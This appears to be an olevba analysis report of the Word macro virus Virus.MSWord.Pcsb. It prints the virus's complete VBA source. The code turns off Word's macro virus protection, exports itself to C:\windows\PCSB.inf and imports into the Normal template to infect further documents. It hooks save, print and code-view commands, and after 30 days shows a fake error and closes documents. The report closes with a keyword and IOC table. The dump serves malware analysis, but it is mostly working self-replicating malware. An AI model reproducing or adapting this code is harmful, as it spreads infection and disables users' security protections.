olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pcsb-5bc220d013603fce9a2e278d8099532ecbaa9524
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pcsb-5bc220d013603fce9a2e278d8099532ecbaa9524 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NEWVIR.bas 
in file: Virus.MSWord.Pcsb-5bc220d013603fce9a2e278d8099532ecbaa9524 - OLE stream: 'Macros/VBA/NEWVIR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub NEWVIR()
On Error Resume Next
' Ïîçäðàâëÿþ, åñëè Âû çäåñü,
' çíà÷èò åùå ÷òî-òî ìîæåòå,
' òàê ÷òî äåðçàéòå, Âàñ îöåíèëè ...
' Ñ óâàæåíèåì ÀÂÒÎÐ
' **************************************
'Îòêëþ÷åíèå ÷åãî íàäî ...
Options.ConfirmConversions = Not (True)
Options.VirusProtection = Not (True)
Options.SaveNormalPrompt = Not (True)
'ñîõðàíåíèå òåëà êóäà íàäî ...
ActiveDocument.VBProject.VBComponents("NEWVIR").Export "C:\windows\PCSB.inf"
ActiveDocument.ReadOnlyRecommended = Not (True)
' Åñëè øàáëîí íå èíôèöèðîâàí, çàïîìíèòü äàòó çàðàæåíèÿ êóäà íàäî ...
If NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name <> "NEWVIR" Then
    Open "C:\windows\Dte.inf" For Output As #1
    Print #1, CDbl(Date)
    Close #1
End If
Call Pig
' Îñòàâëåíèå êîììåíòàðèÿ êóäà íàäî
ActiveDocument.Comments.Add Range, "Ðàáîòàòü íàäî â ðàáî÷åå âðåìÿ. Áàðèê !!!"
' Ïðîâåðêà ÷åãî íàäî, äàáû íå ïîìåðåòü è ðàçìíîæèòüñÿ
Dim ob1, ob2, sss As String
ob1 = NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name
ob2 = ActiveDocument.VBProject.VBComponents.Item("NEWVIR").Name
If ob1 <> "NEWVIR" Then var1 = True
If ob2 <> "NEWVIR" Then var2 = True
' Íà ýòèõ ñòðîêà ÿ î÷åíü äîëãî òðàõàëñÿ ñ àíòèâèðóñîì
' ïîêà íå äîáàâèë ïåðåìåííóþ äëÿ îáìàíà
If var1 = True And var2 = False Then Set Var3 = NormalTemplate.VBProject.VBComponents
sss = "Ïóñòûøêà"
If var1 = False And var2 = True Then Set Var3 = ActiveDocument.VBProject.VBComponents
sss = sss + " äëÿ àíòèâèðóñà"
If var2 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Var3.import "C:\windows\PCSB.inf"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
' À âû ãîâîðèòå öàöêè-ïåöêè
' Îæèäàéòå íîâûé ðåëèç !!!
' Ìû åùå ïîâîþåì ...
End Sub

Public Sub Pig()
' ×òåíèå äàòû çàðàæåíèÿ îòêóäà íàäî
Open "C:\windows\Dte.inf" For Input As #1
Input #1, KontrDate
Close #1
' Åñëè ñî âðåìåíè çàðàæåíèÿ ïðîøåë ìåñÿö, àêòèâèðîâàòü âèðóñ
If Abs(CDbl(Date) - KontrDate) >= 30 Then
   If Time >= "18:00:00" Or Time >= "8:00:00" Then
     ' Ðàáîòàòü íàäî â ðàáî÷åå âðåìÿ !!!
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
     Call HelpAbout
   End If
End If

End Sub
Public Sub AutoOpen()
Call NEWVIR
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Ïðîãðàììà âûïîëíèëà íåäîïóñòèìóþ ôóíêöèþ, äîêóìåíò âûçâàâøèé çáîé ñèñòåìû áóäåò çàêðûò. Åñëè ýòà îøèáêà áóäåò âîçíèêàòü â äàëüíåéøåì, îáðàòèòåñü ê ðàçðàáîò÷èêó.", vbCritical
ActiveDocument.Close
End Sub
Sub FileSave()
On Error Resume Next
Call NEWVIR
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call NEWVIR
End Sub
Sub FilePrint()
Dialogs(wdDialogFilePrint).Show
Call NEWVIR
End Sub
Sub FilePrintDefault()
Call NEWVIR
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call NEWVIR
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call NEWVIR
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call NEWVIR
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |PCSB.inf            |Executable file name                         |
|IOC       |Dte.inf             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

